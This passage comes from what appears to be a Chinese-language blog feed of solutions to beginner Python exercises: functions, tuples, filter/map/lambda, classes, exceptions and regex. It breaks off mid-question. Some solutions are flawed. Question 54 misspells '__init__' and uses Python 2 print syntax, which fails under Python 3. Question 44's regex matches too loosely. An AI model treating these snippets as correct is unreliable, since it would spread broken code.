<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xsum</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xsum(<span class="number">1</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<h1 id="question-27">7. Question 27</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，将一个 integer 转为 str</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int_to_str</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;the value is <span class="subst">&#123;int_to_str(<span class="number">10</span>)&#125;</span>, and the type is <span class="subst">&#123;<span class="built_in">type</span>(int_to_str(<span class="number">10</span>))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="question-28">8. Question 28</h1>
<p>与 27 重复</p>
<h1 id="question-29">9. Question 29</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，将两个 str 类型的整数相加，然后返回结果</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_num_of_str</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(str1) + <span class="built_in">int</span>(str2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sum_num_of_str(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h1 id="question-30">10. Question 30</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，将两个字符串拼接，然后返回</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">concatenate_two_str</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> str1+str2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(concatenate_two_str(<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27; world&#x27;</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 41-50</title>
    <url>/2022/07/04/Question%2041-50/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-41">1. Question 41</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个元组，元组内的元素为 [1, 20] 的平方。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_tuple</span>():</span></span><br><span class="line">    lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        lst.append(i**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(lst)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(produce_tuple())</span><br></pre></td></tr></table></figure>
<h1 id="question-42">2. Question 42</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个元组
(1,2,3,4,5,6,7,8,9,10)，将其分为前半部分和后半部分，分别打印</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">length = <span class="built_in">len</span>(input_tuple)</span><br><span class="line">tp1 = input_tuple[:length//<span class="number">2</span>]</span><br><span class="line">tp2 = input_tuple[length//<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(tp1)</span><br><span class="line"><span class="built_in">print</span>(tp2)</span><br></pre></td></tr></table></figure>
<h1 id="question-43">3. Question 43</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个元组
(1,2,3,4,5,6,7,8,9,10)，生成另一个元组，只包含给定元组中的偶数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tp = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tp)):</span><br><span class="line">    <span class="keyword">if</span> tp[i]%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        lst.append(tp[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(lst))</span><br></pre></td></tr></table></figure>
<h1 id="question-44">4. Question 44</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个字符串，如果是 'yes'、'YES'、'Yes'，则输出 'Yes'，否则输出
'No'</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> re.search(<span class="string">r&#x27;(yes)|(Yes)|(YES)&#x27;</span>, <span class="built_in">str</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="question-45">5. Question 45</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个列表：[1, 2, 3, 4, 5, 6, 7, 8, 9,
10]，筛选出其中的偶数，使用 filter() 函数。</li>
</ul>
<p><strong>要求</strong>：</p>
<ul>
<li>使用 filter()</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">res =<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x%<span class="number">2</span>==<span class="number">0</span>, lst))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h2 id="filter-函数">5.1. filter 函数</h2>
<p>作用：用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的
filter 对象（迭代器对象）。</p>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">filter</span>(function, iterable)</span><br></pre></td></tr></table></figure>
<ul>
<li>function：判断函数/过滤函数</li>
<li>iterable：可迭代对象，作为函数的参数</li>
</ul>
<h1 id="question-46">6. Question 46</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个列表：[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]，使用 map()
函数生成一个新的列表，元素为原来列表中元素的平方。</li>
</ul>
<p><strong>要求</strong>：</p>
<ul>
<li>使用 map()</li>
<li>使用 lambda 匿名函数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">res = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, lst))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="question-47">7. Question 47</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个列表：[1, 2, 3, 4, 5, 6, 7, 8, 9,
10]，生成一个新的列表，元素为原来列表中偶数的平方。</li>
</ul>
<p><strong>要求</strong>：</p>
<ul>
<li>使用 filter() 筛选出偶数</li>
<li>使用 map() 得到生成新的列表</li>
<li>使用 lambda 匿名函数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">even_nums = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x%<span class="number">2</span>==<span class="number">0</span>, lst))</span><br><span class="line">res = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x**<span class="number">2</span>, even_nums))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="question-48">8. Question 48</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 filter() 生成一个列表，列表元素为 [1, 20] 之间的偶数。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x%<span class="number">2</span>==<span class="number">0</span>, [num <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>)])))</span><br></pre></td></tr></table></figure>
<h1 id="question-49">9. Question 49</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 map() 生成一个列表，列表元素为 [1, 20] 每个数字的平方。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x**<span class="number">2</span>, [num <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>)])))</span><br></pre></td></tr></table></figure>
<h1 id="question-50">10. Question 50</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个名为 American 的 class，拥有一个静态方法
printNationality。使用 <span class="citation"
data-cites="staticmethod">@staticmethod</span></li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">American</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printNationality</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;American.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jack = American()</span><br><span class="line">jack.printNationality()</span><br><span class="line">American.printNationality()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 51-60</title>
    <url>/2022/07/04/Question%2051-60/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-51">1. Question 51</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个类 American 和它的子类 NewYorker</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">American</span>:</span></span><br><span class="line">    country = <span class="string">&#x27;american&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewYorker</span>(<span class="params">American</span>):</span></span><br><span class="line">    city = <span class="string">&#x27;NewYork&#x27;</span></span><br><span class="line"></span><br><span class="line">jack = NewYorker()</span><br><span class="line"><span class="built_in">print</span>(jack.city)</span><br><span class="line"><span class="built_in">print</span>(jack.country)</span><br></pre></td></tr></table></figure>
<h1 id="question-52">2. Question 52</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个类
Circle，实例对象由半径确定，这个类有一个方法可以计算面积。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cmath <span class="keyword">import</span> pi</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, radius</span>):</span></span><br><span class="line">        self.radius = radius</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute_area</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> pi * (self.radius ** <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">c = Circle(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(c.compute_area())</span><br></pre></td></tr></table></figure>
<h1 id="question-53">3. Question 53</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个类
Rectangle，由长、宽确定，这个类有一个方法可以计算面积。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, length, width</span>):</span></span><br><span class="line">        self.length = length</span><br><span class="line">        self.width = width</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute_area</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.width * self.length</span><br><span class="line"></span><br><span class="line">r = Rectangle(<span class="number">5</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(r.compute_area())</span><br></pre></td></tr></table></figure>
<h1 id="question-54">4. Question 54</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>定义一个类 Shape，以及它的子类 Square，Square 有一个 init
方法，传入参数为 length，两个类都有 area 方法，返回面积，Shape 应该返回
0。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.area = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span>(<span class="params">Shape</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, length</span>):</span></span><br><span class="line">        self.length = length</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.length**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = Square(<span class="number">10</span>)</span><br><span class="line">s.area()</span><br><span class="line">s1 = Shape()</span><br><span class="line">s1.area()</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>考察 Python 中对父类方法的重写，只需要名字一样即可；</li>
<li>方法重写后，子类想要使用父类的方法（重写前的方法），可以使用
<code>super().方法()</code> 或者直接使用 <code>类名.方法()</code></li>
</ul>
<h1 id="question-55">5. Question 55</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>题目引起一个 RuntimeError 异常</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;something wrong.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>括号里面的内容会作为 RuntimeError 的说明。</li>
</ul>
<h1 id="question-56">6. Question 56</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>编写一个函数进行 5/0，然后捕捉异常。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">throw</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    throw()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;block for clean up.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="question-57">7. Question 57</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>自定义一个异常类，带有一个字符串信息属性。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Custom_Exception</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        self.msg = msg</span><br><span class="line"></span><br><span class="line">err = Custom_Exception(<span class="string">&#x27;something wrong.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="question-58">8. Question 58</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>输入为邮箱地址，格式为：username@companyname.com，从中提取出用户名。用户名和公司只有字母。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">names = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    email_addr = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> email_addr:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res = re.findall(<span class="string">r&#x27;(\w+)(?=@)&#x27;</span>, email_addr)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        names.append(res[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(names))</span><br></pre></td></tr></table></figure>
<h1 id="question-59">9. Question 59</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>同上，不过提取的是公司名</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">companies = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    email_addr = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> email_addr:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res = re.findall(<span class="string">r&#x27;(?&lt;=@)(\w+)&#x27;</span>, email_addr)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        companies.append(res[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(companies))</span><br></pre></td></tr></table></figure>
<h1 id="question-60">10. Question 60</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>接收一个字符串，由空格分隔，提取出其中的数字。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">partt = <span class="string">r&#x27;\d+&#x27;</span></span><br><span class="line">p = re.<span class="built_in">compile</span>(partt)</span><br><span class="line">nums = p.findall(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 31-40</title>
    <url>/2022/07/04/Question%2031-40/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-31">1. Question 31</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，接收两个字符串，打印长度较长的字符串，如果长度一样，则两个字符串
line by line 打印</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_len</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    len1 = <span class="built_in">len</span>(str1)</span><br><span class="line">    len2 = <span class="built_in">len</span>(str2)</span><br><span class="line">    <span class="keyword">if</span> len1 == len2:</span><br><span class="line">        <span class="built_in">print</span>(str1)</span><br><span class="line">        <span class="built_in">print</span>(str2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(str1 <span class="keyword">if</span> len1&gt;len2 <span class="keyword">else</span> str2)</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;world&#x27;</span></span><br><span class="line">get_max_len(str1, str2)</span><br></pre></td></tr></table></figure>
<h1 id="question-32">2. Question 32</h1>
<p><strong>题目</strong>：(easy)</p>
<ul>
<li>定义一个函数，判断数字的奇偶性，如果是偶数，则输出 "It is an even
number"，如果是奇数，则输出 "It is an odd number"</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge_even_or_odd</span>(<span class="params">num</span>):</span></span><br><span class="line">    res1 = <span class="string">&#x27;It is an even number&#x27;</span></span><br><span class="line">    res2 = <span class="string">&#x27;It is an odd number&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (res1 <span class="keyword">if</span> num%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> res2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(judge_even_or_odd(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<h1 id="question-33">3. Question 33</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个字典，该字典的 key 为 [1, 3]，对应的 value 为
key 的平方</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_dict</span>():</span></span><br><span class="line">    res = <span class="built_in">dict</span>()</span><br><span class="line">    res[<span class="number">1</span>] = <span class="number">1</span>**<span class="number">2</span></span><br><span class="line">    res[<span class="number">2</span>] = <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">    res[<span class="number">3</span>] = <span class="number">3</span>**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(produce_dict())</span><br></pre></td></tr></table></figure>
<h1 id="question-34">4. Question 34</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个字典，该字典的 key 为 [1, 20]，对应的 value 为
key 的平方</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_dict</span>():</span></span><br><span class="line">    res = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res[key] = key ** <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(produce_dict())</span><br></pre></td></tr></table></figure>
<h1 id="question-35">5. Question 35</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个字典，该字典的 key 为 [1, 20]，对应的 value 为
key 的平方。该函数只打印 values</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_dict</span>():</span></span><br><span class="line">    res = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res[key] = key ** <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, v) <span class="keyword">in</span> res.items():</span><br><span class="line">        <span class="built_in">print</span>(res[k])</span><br><span class="line"></span><br><span class="line">produce_dict()</span><br></pre></td></tr></table></figure>
<h1 id="question-36">6. Question 36</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个字典，该字典的 key 为 [1, 20]，对应的 value 为
key 的平方。该函数只打印 keys</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_dict</span>():</span></span><br><span class="line">    res = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res[key] = key ** <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, v) <span class="keyword">in</span> res.items(): <span class="comment"># 或者 for k in res.keys()</span></span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line">produce_dict()</span><br></pre></td></tr></table></figure>
<h1 id="question-37">7. Question 37</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个列表，列表内的元素为 [1, 20] 的平方。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_list</span>():</span></span><br><span class="line">    res = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res.append((i**<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(produce_list())</span><br></pre></td></tr></table></figure>
<h1 id="question-38">8. Question 38</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，生成一个列表，列表内的元素为 [1, 20] 的平方。只打印前
5 个数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_list</span>():</span></span><br><span class="line">    res = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res.append((i**<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(res[:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">produce_list()</span><br></pre></td></tr></table></figure>
<h1 id="question-39">9. Question 39</h1>
<ul>
<li>定义一个函数，生成一个列表，列表内的元素为 [1, 20] 的平方。只打印后
5 个数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_list</span>():</span></span><br><span class="line">    res = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res.append((i**<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(res[-<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line">produce_list()</span><br></pre></td></tr></table></figure>
<h1 id="question-40">10. Question 40</h1>
<ul>
<li>定义一个函数，生成一个列表，列表内的元素为 [1, 20] 的平方。除了前 5
